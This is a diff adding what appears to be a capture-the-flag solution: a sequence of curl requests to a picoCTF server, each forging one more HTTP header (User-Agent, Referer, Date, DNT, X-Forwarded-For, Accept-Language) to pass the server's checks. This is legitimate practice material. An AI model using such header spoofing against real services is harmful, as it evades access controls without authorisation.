@@ -1,0 +1,10 @@
+curl -A "PicoBrowser" http://mercury.picoctf.net:52362/ --referer http://mercury.picoctf.net:52362/
+↓
+curl -A "PicoBrowser" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:52362/ --referer http://mercury.picoctf.net:52362/
+↓
+curl -A "PicoBrowser" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:52362/ --referer http://mercury.picoctf.net:52362/
+↓
+curl -A "PicoBrowser" -H "X-Forwarded-For: 2.16.66.1" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:52362/ --referer http://mercury.picoctf.net:52362/
+↓
+curl -A "PicoBrowser" -H "Accept-Language: sv-SE" -H "X-Forwarded-For: 2.16.66.1" -H "DNT: 1" -H "Date: Wed, 15 Aug 2018 07:28:00 JST" http://mercury.picoctf.net:52362/ --referer http://mercury.picoctf.net:52362/
+↓
